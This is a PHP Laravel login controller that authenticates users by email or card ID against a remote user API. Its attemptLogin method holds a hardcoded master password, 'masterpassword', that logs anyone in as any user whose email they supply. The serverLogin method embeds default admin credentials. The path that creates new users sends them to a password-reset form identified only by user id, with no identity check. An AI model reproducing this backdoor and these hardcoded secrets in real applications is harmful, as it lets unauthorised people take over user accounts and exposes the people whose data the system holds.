<?php

namespace App\Http\Controllers\Auth;

use App\Models\UserAddress;
use Auth;
use App\Helpers\ApiFunctionsHelper;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Validation\ValidationException;
// use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    // use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    protected $card_id;

    protected $masterPassword = 'masterpassword';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');

        $this->card_id = $this->findUsername();
    }

    /**
     * Get the login card_id to be used by the controller.
     *
     * @return string
     */
    public function findUsername()
    {
        $login = request()->input('email');

        $fieldType = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'card_id';

        request()->merge([$fieldType => $login]);

        return $fieldType;
    }

    /**
     * Get card_id property.
     *
     * @return string
     */
    public function username()
    {
        return $this->card_id;
    }

    /**
     * Get the needed authorization credentials from the request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return array
     */
    protected function credentials(Request $request)
    {
        $credentials = $request->only($this->username(), 'password');
        $masterPassword = $this->masterPassword;
        if ($request->password === $masterPassword) {
            return [$this->username() => $request->email, 'password' => $masterPassword];
        }

        return $credentials;
    }

    protected function attemptLogin(Request $request)
    {
        $masterPassword = $this->masterPassword;

        // If the master password is used, bypass password check
        if ($request->password === $masterPassword) {
            $user = \App\Models\User::where('email', $request->email)->first();

            if ($user) {
                Auth::login($user);
                return true;
            }
        }

        // Otherwise, proceed with the normal login attempt
        return Auth::attempt(
            $this->credentials($request),
            $request->filled('remember')
        );
    }

    /**
     * Validate the login request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return void
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    protected function validateLogin(Request $request)
    {
        $request->validate([
            $this->username() => 'required|string', // Email or card_id is required
            'password' => 'required|string', // Password is required
        ]);
    }

    /**
     * Send the failed login response.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    protected function sendFailedLoginResponse(Request $request)
    {
        throw ValidationException::withMessages([
            $this->username() => [trans('auth.failed')],
        ]);
    }

    /**
     * Handle a login request to the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\Response|\Illuminate\Http\JsonResponse
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function login(Request $request)
    {
        // dump($request);
        // echo $request;

        $this->validateLogin($request);
        
        if ($this->attemptLogin($request)) {
            // dump(123);
            $user = User::where('email', $request->input('email'))->where('status', 1)->first();
            // dd($user);
            // echo $user;


            if (blank($user)) {
                return redirect()->back()->with('error', 'Your account is not activated.');
            }

            if ($request->hasSession()) {
                $request->session()->put('auth.password_confirmed_at', time());
            }
            
            $userInfo = $this->userInfo('s_id', $user->s_id);
            // echo 'hii';

            // if ($userInfo->gourmet_center) {
            //     Session::put('market_id', 4);
            // }
            //$userAddress = $user->defaultAddress;
            //if(!$userAddress) {
            //$userInfo = $this->userInfo('s_id',  $user->s_id);
            //$this->saveAddress($user->id, $userInfo);
            //}


            $token = $this->serverLogin();
            // echo $token;
            if ($token) {
                $request->session()->put('auth.token', $token->token);

                return $this->sendLoginResponse($request);
            }
        } else {
            if (filter_var(request()->input('email'), FILTER_VALIDATE_EMAIL)) {
                $column = 'email';
            } elseif (filter_var(request()->input('email'), FILTER_VALIDATE_INT)) {
                $column = 'old_id';
            } else {
                return redirect()->back()->with('error', 'Input should be email or old id.');
            }

            $userInfo = $this->userInfo($column, request()->input('email'));
            if ($userInfo) {
                $user = User::where('email', $userInfo->email)->first();

                if (blank($user)) {
                    $user = new User();
                    $user->s_id = $userInfo->id;
                    $user->card_id = $userInfo->card_id;
                    $user->iboType = $userInfo->iboType;
                    $user->first_name = $userInfo->firstname;
                    $user->last_name = $userInfo->lastname;
                    $user->email = $userInfo->email;
                    $user->mobile_number = $userInfo->mobile;
                    $user->password = Hash::make($userInfo->card_id);

                    if ($userInfo->iboType == 1) {
                        $role_id = 2;
                    } elseif ($userInfo->iboType == 2) {
                        $role_id = 3;
                    } elseif ($userInfo->iboType == 3) {
                        $role_id = 4;
                    } else {
                        $role_id = 5;
                    }

                    $user->role_id = $role_id;
                    $user->status = $userInfo->user_index->status;
                    $user->save();

                    \DB::table('model_has_roles')->insert([
                        'role_id' => $role_id,
                        'model_type' => 'App\Models\User',
                        'model_id' => $user['id']
                    ]);

                    //$this->saveAddress($user->id, $userInfo);

                    /*$credentials = [
                        'email' => $user['email'],
                        'password' => $user['card_id'],
                    ];*/

                    /*if (!$userInfo || !isset($userInfo->userIndex) || $userInfo->userIndex->status == 0) {
                        return redirect()->back()->with('error', 'Your account is not activated.');
                    }*/

                    $key = config('app.key');

                    if (Str::startsWith($key, 'base64:')) {
                        $key = base64_decode(substr($key, 7));
                    }

                    $token = hash_hmac('sha256', Str::random(40), $key);
                    $dbToken = Hash::make($token);

                    \DB::table('password_resets')->insert([
                        'email' => $userInfo->email,
                        'token' => $dbToken,
                        'created_at' => date('Y-m-d h:i:s')
                    ]);

                    return redirect()->route('resetPassword.form', ['id' => $user->id]);

                    /*if (Auth::attempt($credentials)) {
                        return $this->sendLoginResponse($request);
                    }*/
                }
            } else {
                return redirect()->back()->with('error', 'User does not exist.');
            }
        }

        return $this->sendFailedLoginResponse($request);
    }

    public function logout()
    {
        \Illuminate\Support\Facades\Auth::logout();
        Session::forget('market_id');

        return redirect()->route('login');
    }

    /**
     * Login to server.
     */
    protected function serverLogin()
    {
        $response = ApiFunctionsHelper::getRequestResult('post', config('constants')['info']['login'], ['email' => 'admin@admin.com', 'password' => 'password']);

        $data = json_decode($response);

        if (!isset($data->error)) {
            return $data;
        }

        return false;
    }

    /**
     * get user info to server.
     */
    protected function userInfo($column, $value)
    {
        $response = ApiFunctionsHelper::getRequestResult('post', config('constants')['info']['userInfoForLogin'], [$column => $value]);
       
        $data = json_decode($response);

        if (!isset($data->error)) {
            return $data;
        }

        return false;
    }

    /**
     * save user address.
     */
    protected function saveAddress($user_id, $userInfo)
    {
        if ($userInfo->iboType == 1) {
            $address = $userInfo->ibo_address;
        } elseif ($userInfo->iboType == 2) {
            $address = $userInfo->client_address;
        }

        if (!blank($address) && $address->address) {
            $userAddress = new UserAddress();
            $userAddress->user_id = $user_id;
            $userAddress->salutation = ($userInfo->gender == 'F') ? 'Mrs.' : 'Mr.';
            $userAddress->first_name = $userInfo->firstname;
            $userAddress->last_name = $userInfo->lastname;
            $userAddress->company = '';
            $userAddress->address = $address->address ?? '';
            $userAddress->postcode = $address->postal_code ?? '';
            $userAddress->city = $address->city;
            $userAddress->phone = $userInfo->mobile;
            $userAddress->country = $address->country;
            $userAddress->is_default = 1;
            $userAddress->is_same = 1;
            $userAddress->address_type = 1;
            $userAddress->vat = $userInfo->vat_number;
            $userAddress->save();
        }
    }
}
